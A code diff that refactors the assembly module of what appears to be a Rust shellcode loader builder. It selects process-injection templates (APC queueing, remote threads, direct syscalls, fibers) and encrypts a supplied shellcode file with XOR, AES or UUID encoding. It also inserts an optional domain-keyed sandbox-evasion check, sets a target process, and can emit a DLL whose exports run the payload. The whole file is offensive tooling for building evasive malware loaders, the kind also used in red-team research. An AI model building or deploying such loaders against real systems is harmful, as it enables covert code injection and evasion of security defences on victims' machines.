@@ -1,28 +1,26 @@
-// Module building the end-result Rust code
-use crate::aes::meta_aes;
+use crate::aes::encrypt_aes;
 use crate::arg_parser::{Encryption, Execution, Format, Order};
-use crate::tools::random_aes_iv;
-use crate::tools::random_aes_key;
-use crate::tools::{absolute_path, path_to_string, random_u8};
-use crate::uuid_enc::meta_uuid;
-use crate::xor::meta_xor;
-use crate::sandbox::meta_sandbox;
+use crate::sandbox::build_sandbox;
+use crate::tools::{
+    absolute_path, quoted_path, random_aes_iv, random_aes_key, random_u8, EncryptionOutput,
+};
+use crate::uuid_enc::encrypt_uuid;
+use crate::xor::encrypt_xor;
 use fs_extra::dir::{copy, CopyOptions};
 use std::collections::HashMap;
 use std::fs::{self, OpenOptions};
 use std::io::prelude::*;
-use std::path::Path;
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use std::process::exit;
-use std::str;
 use std::time::{SystemTime, UNIX_EPOCH};
+
+const OUTPUT_DIR: &str = "shared";
 
 fn search_and_replace(
     path_to_file: &Path,
     search: &str,
     replace: &str,
 ) -> Result<(), Box<dyn std::error::Error>> {
-    // thanks to https://users.rust-lang.org/t/replacing-content-in-file/52690/5
     let file_content = fs::read_to_string(path_to_file)?;
     let new_content = file_content.replace(search, replace);
 
@@ -35,16 +33,12 @@ fn search_and_replace(
     Ok(())
 }
 
-fn create_root_folder(general_output_folder: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
-    let time = format!(
-        "{:?}",
-        SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs()
-    );
-    let prefix = "output_";
-    let result = [prefix, &time].join("");
-    println!("[+] Creating output folder: {}", &result);
-    let mut result_path = general_output_folder.to_path_buf();
-    result_path.push(result);
+fn create_root_folder(parent: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
+    let timestamp = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
+    let folder_name = format!("output_{}", timestamp);
+    println!("[+] Creating output folder: {}", &folder_name);
+
+    let result_path = parent.join(folder_name);
     fs::create_dir(&result_path)?;
 
     Ok(result_path)
@@ -60,15 +54,8 @@ fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::E
     Ok(())
 }
 
-pub fn meta_puzzle(order: Order) -> PathBuf {
-    println!("[+] Assembling Rust code..");
-    //dbg!("{}", &order.encryption);
-    let mut general_output_folder = PathBuf::new();
-    general_output_folder.push("shared");
-
-    let path_to_template = match order.execution {
-        // Execution::CreateThread => Path::new("templates/createThread/."),
-        // Execution::CreateRemoteThread => Path::new("templates/createRemoteThread/."),
+fn template_path_for_execution(execution: &Execution) -> &'static Path {
+    match execution {
         Execution::NtQueueUserAPC => Path::new("templates/ntAPC/."),
         Execution::NtCreateRemoteThread => Path::new("templates/ntCRT/."),
         Execution::SysCreateRemoteThread => Path::new("templates/sysCRT/."),
@@ -76,220 +63,158 @@ pub fn meta_puzzle(order: Order) -> PathBuf {
         Execution::WinFiber => Path::new("templates/winFIBER/."),
         Execution::NtFiber => Path::new("templates/ntFIBER/."),
         Execution::SysFiber => Path::new("templates/sysFIBER/."),
-    };
-
-    let folder: PathBuf = match create_root_folder(&general_output_folder) {
-        Ok(content) => content,
-        Err(err) => panic!("{:?}", err),
-    };
-    match copy_template(path_to_template, &folder) {
-        Ok(_) => (),
-        Err(err) => panic!("{:?}", err),
     }
-    let mut to_main = folder.clone();
-    to_main.push("src");
-    to_main.push("main.rs");
+}
 
-    let absolute_shellcode_path = match absolute_path(&order.shellcode_path) {
-        Ok(path) => path,
-        Err(err) => panic!("{:?}", err),
-    };
-
-    let absolute_shellcode_path_as_string: String = path_to_string(&absolute_shellcode_path);
-
-    let mut path_to_cargo = to_main.clone();
-    path_to_cargo.pop();
-    path_to_cargo.pop();
-    path_to_cargo.push("Cargo.toml");
-
-    let mut to_be_replaced = HashMap::new();
-    to_be_replaced.insert("{{DEPENDENCIES}}", "".to_string());
-    to_be_replaced.insert("{{IMPORTS}}", "".to_string());
-    to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", "".to_string());
-    to_be_replaced.insert("{{MAIN}}", "".to_string());
-    to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_shellcode_path_as_string);
-    to_be_replaced.insert("{{DLL_MAIN}}", "".to_string());
-    to_be_replaced.insert("{{DLL_FORMAT}}", "".to_string());
-    to_be_replaced.insert("{{TARGET_PROCESS}}", order.target_process);
-
+fn build_encrypted_output(
+    order: &Order,
+    src_dir: &Path,
+) -> (EncryptionOutput, String) {
     match order.encryption {
         Encryption::Xor => {
-            let key = random_u8();
-            let mut path_to_xor = to_main.clone();
-            path_to_xor.pop();
-            path_to_xor.push("input.xor");
-            let absolute_path_to_xor = match absolute_path(&path_to_xor) {
-                Ok(path) => path,
-                Err(err) => panic!("{:?}", err),
-            };
-            let absolute_path_to_xor_as_string = path_to_string(&absolute_path_to_xor);
-
-            let xor_args: HashMap<String, String> =
-                meta_xor(&order.shellcode_path, &path_to_xor, key);
-            let decryption_function = match xor_args.get("decryption_function") {
-                Some(content) => content,
-                None => panic!("I don't even know how this happened.."),
-            };
-            let main = match xor_args.get("main") {
-                Some(content) => content,
-                None => panic!("I don't even know how this happened.."),
-            };
-            to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", decryption_function.to_string());
-            to_be_replaced.insert("{{MAIN}}", main.to_string());
-            to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_path_to_xor_as_string);
+            let path = src_dir.join("input.xor");
+            let abs = absolute_path(&path).expect("Invalid XOR output path");
+            let output = encrypt_xor(&order.shellcode_path, &path, random_u8());
+            (output, quoted_path(&abs))
         }
         Encryption::Aes => {
-            let key = random_aes_key();
-            let iv = random_aes_iv();
-
-            let mut path_to_aes = to_main.clone();
-            path_to_aes.pop();
-            path_to_aes.push("input.aes");
-            let absolute_path_to_aes = match absolute_path(&path_to_aes) {
-                Ok(path) => path,
-                Err(err) => panic!("{:?}", err),
-            };
-            let absolute_path_to_aes_as_string = path_to_string(&absolute_path_to_aes);
-
-            let aes_args: HashMap<String, String> =
-                meta_aes(&order.shellcode_path, &path_to_aes, &key, &iv);
-
-            let decryption_function = match aes_args.get("decryption_function") {
-                Some(content) => content,
-                None => panic!("I don't even know how this happened.."),
-            };
-            let main = match aes_args.get("main") {
-                Some(content) => content,
-                None => panic!("I don't even know how this happened.."),
-            };
-            let dependencies = match aes_args.get("dependencies") {
-                Some(content) => content,
-                None => panic!("I don't even know how this happened.."),
-            };
-            let imports = match aes_args.get("imports") {
-                Some(content) => content,
-                None => panic!("I don't even know how this happened.."),
-            };
-            to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", decryption_function.to_string());
-            to_be_replaced.insert("{{MAIN}}", main.to_string());
-            to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_path_to_aes_as_string);
-            to_be_replaced.insert("{{DEPENDENCIES}}", dependencies.to_string());
-            to_be_replaced.insert("{{IMPORTS}}", imports.to_string());
+            let path = src_dir.join("input.aes");
+            let abs = absolute_path(&path).expect("Invalid AES output path");
+            let output = encrypt_aes(&order.shellcode_path, &path, &random_aes_key(), &random_aes_iv());
+            (output, quoted_path(&abs))
         }
         Encryption::Uuid => {
-            let mut path_to_uuid = to_main.clone();
-            path_to_uuid.pop();
-            path_to_uuid.push("input.uuid");
-            let absolute_path_to_uuid = match absolute_path(&path_to_uuid) {
-                Ok(path) => path,
-                Err(err) => panic!("{:?}", err),
-            };
-            let absolute_path_to_uuid_as_string = path_to_string(&absolute_path_to_uuid);
-
-            let uuid_args: HashMap<String, String> =
-                meta_uuid(&order.shellcode_path, &path_to_uuid);
-            let decryption_function = match uuid_args.get("decryption_function") {
-                Some(content) => content,
-                None => panic!("I don't even know how this happened.."),
-            };
-            let main = match uuid_args.get("main") {
-                Some(content) => content,
-                None => panic!("I don't even know how this happened.."),
-            };
-            to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", decryption_function.to_string());
-            to_be_replaced.insert("{{MAIN}}", main.to_string());
-            to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_path_to_uuid_as_string);
+            let path = src_dir.join("input.uuid");
+            let abs = absolute_path(&path).expect("Invalid UUID output path");
+            let output = encrypt_uuid(&order.shellcode_path, &path);
+            (output, quoted_path(&abs))
         }
     }
-    if order.sandbox != "None" {
-        // if sandbox is not None, we need to add the sandbox function and imports
-        let sandbox_args: HashMap<String, String> = meta_sandbox(order.sandbox.clone());
-        let sandbox_function = match sandbox_args.get("sandbox_function") {
-            Some(content) => content,
-            None => panic!("I don't even know how this happened.."),
-        };
-        to_be_replaced.insert("{{SANDBOX}}", sandbox_function.to_string());
+}
 
-        let sandbox_imports = match sandbox_args.get("sandbox_import") {
-            Some(content) => content,
-            None => panic!("I don't even know how this happened.."),
-        };
-        to_be_replaced.insert("{{SANDBOX_IMPORTS}}", sandbox_imports.to_string());
-    } else {
-        // if sandbox is None, we need to remove the sandbox function and imports
-        to_be_replaced.insert("{{SANDBOX}}", "".to_string());
-        to_be_replaced.insert("{{SANDBOX_IMPORTS}}", "".to_string());
+fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, String> {
+    let shellcode_abs = absolute_path(&order.shellcode_path).expect("Invalid shellcode path");
+
+    let mut replacements: HashMap<&'static str, String> = HashMap::new();
+    replacements.insert("{{DEPENDENCIES}}", String::new());
+    replacements.insert("{{IMPORTS}}", String::new());
+    replacements.insert("{{DECRYPTION_FUNCTION}}", String::new());
+    replacements.insert("{{MAIN}}", String::new());
+    replacements.insert("{{PATH_TO_SHELLCODE}}", quoted_path(&shellcode_abs));
+    replacements.insert("{{DLL_MAIN}}", String::new());
+    replacements.insert("{{DLL_FORMAT}}", String::new());
+    replacements.insert("{{TARGET_PROCESS}}", order.target_process.clone());
+    replacements.insert("{{SANDBOX}}", String::new());
+    replacements.insert("{{SANDBOX_IMPORTS}}", String::new());
+
+    let (enc_output, shellcode_path_str) = build_encrypted_output(order, src_dir);
+    replacements.insert("{{DECRYPTION_FUNCTION}}", enc_output.decryption_function);
+    replacements.insert("{{MAIN}}", enc_output.main);
+    replacements.insert("{{PATH_TO_SHELLCODE}}", shellcode_path_str);
+    if let Some(deps) = enc_output.dependencies {
+        replacements.insert("{{DEPENDENCIES}}", deps);
+    }
+    if let Some(imports) = enc_output.imports {
+        replacements.insert("{{IMPORTS}}", imports);
     }
 
-    match order.format {
-        Format::Dll => {
-            let dll_cargo_conf = r#"
-            [lib]
-            crate-type = ["cdylib"]"#;
+    if let Some(ref domain) = order.sandbox {
+        let sandbox_output = build_sandbox(domain);
+        replacements.insert("{{SANDBOX}}", sandbox_output.sandbox_function);
+        replacements.insert("{{SANDBOX_IMPORTS}}", sandbox_output.sandbox_import);
+    }
 
-            to_be_replaced.insert("{{DLL_FORMAT}}", dll_cargo_conf.to_string());
+    replacements
+}
 
-            let dll_main_fn = r#"
-            #[no_mangle]
-            #[allow(non_snake_case, unused_variables, unreachable_patterns)]
-            extern "system" fn DllMain(
-                dll_module: u32,
-                call_reason: u32,
-                _: *mut ())
-                -> bool
-            {
-                match call_reason {
-                    DLL_PROCESS_ATTACH => (),
-                    DLL_PROCESS_DETACH => (),
-                    _ => ()
-                }
+fn apply_dll_format(
+    replacements: &mut HashMap<&'static str, String>,
+    main_rs_path: &Path,
+) -> PathBuf {
+    let dll_cargo_conf = r#"
+    [lib]
+    crate-type = ["cdylib"]"#;
+    replacements.insert("{{DLL_FORMAT}}", dll_cargo_conf.to_string());
 
-                true
-            }
-            #[no_mangle]
-            pub extern "C" fn DllRegisterServer() {{
-                main()
-            }}
-            #[no_mangle]
-            pub extern "C" fn DllGetClassObject() {{
-                main()
-            }}
-            #[no_mangle]
-            pub extern "C" fn DllUnregisterServer() {{
-                main()
-            }}
-            #[no_mangle]
-            pub extern "C" fn Run() {{
-                main()
-            }}
-            "#;
-            to_be_replaced.insert("{{DLL_MAIN}}", dll_main_fn.to_string());
-
-            // changing "main.rs" to "lib.rs"
-
-            let mut to_lib = to_main.clone();
-            to_lib.pop();
-            to_lib.push("lib.rs");
-
-            match fs::rename(to_main, to_lib.clone()) {
-                Ok(()) => (),
-                Err(e) => {
-                    eprintln!("[-] Error while renaming main.rs to lib.rs: {}", e);
-                    exit(1);
-                }
-            }
-
-            // need to change the main file path, as it is now renamed "lib.rs" for DLL format.
-            to_main = to_lib;
+    let dll_main_fn = r#"
+    #[no_mangle]
+    #[allow(non_snake_case, unused_variables, unreachable_patterns)]
+    extern "system" fn DllMain(
+        dll_module: u32,
+        call_reason: u32,
+        _: *mut ())
+        -> bool
+    {
+        match call_reason {
+            DLL_PROCESS_ATTACH => (),
+            DLL_PROCESS_DETACH => (),
+            _ => ()
         }
-        Format::Exe => (), // nothing to do here, as the default "replace" values are emspty strings
+
+        true
+    }
+    #[no_mangle]
+    pub extern "C" fn DllRegisterServer() {{
+        main()
+    }}
+    #[no_mangle]
+    pub extern "C" fn DllGetClassObject() {{
+        main()
+    }}
+    #[no_mangle]
+    pub extern "C" fn DllUnregisterServer() {{
+        main()
+    }}
+    #[no_mangle]
+    pub extern "C" fn Run() {{
+        main()
+    }}
+    "#;
+    replacements.insert("{{DLL_MAIN}}", dll_main_fn.to_string());
+
+    let lib_rs_path = main_rs_path.with_file_name("lib.rs");
+    if let Err(e) = fs::rename(main_rs_path, &lib_rs_path) {
+        eprintln!("[-] Error while renaming main.rs to lib.rs: {}", e);
+        exit(1);
     }
 
-    for (key, value) in to_be_replaced.iter() {
-        let _ = search_and_replace(&to_main, key, value);
-        let _ = search_and_replace(&path_to_cargo, key, value);
+    lib_rs_path
+}
+
+fn apply_replacements(
+    replacements: &HashMap<&str, String>,
+    main_path: &Path,
+    cargo_path: &Path,
+) {
+    for (key, value) in replacements {
+        search_and_replace(main_path, key, value)
+            .unwrap_or_else(|e| eprintln!("Warning: template replace failed for {}: {}", key, e));
+        search_and_replace(cargo_path, key, value)
+            .unwrap_or_else(|e| eprintln!("Warning: cargo replace failed for {}: {}", key, e));
     }
-    
+}
+
+pub fn assemble(order: Order) -> PathBuf {
+    println!("[+] Assembling Rust code..");
+
+    let template_path = template_path_for_execution(&order.execution);
+    let folder = create_root_folder(Path::new(OUTPUT_DIR))
+        .expect("Failed to create output folder");
+    copy_template(template_path, &folder).expect("Failed to copy template");
+
+    let src_dir = folder.join("src");
+    let main_rs = src_dir.join("main.rs");
+    let cargo_toml = folder.join("Cargo.toml");
+
+    let mut replacements = build_replacements(&order, &src_dir);
+
+    let target_file = match order.format {
+        Format::Dll => apply_dll_format(&mut replacements, &main_rs),
+        Format::Exe => main_rs,
+    };
+
+    apply_replacements(&replacements, &target_file, &cargo_toml);
+
     println!("[+] Done assembling Rust code!");
-    Path::new(&folder).to_path_buf()
+    folder
 }
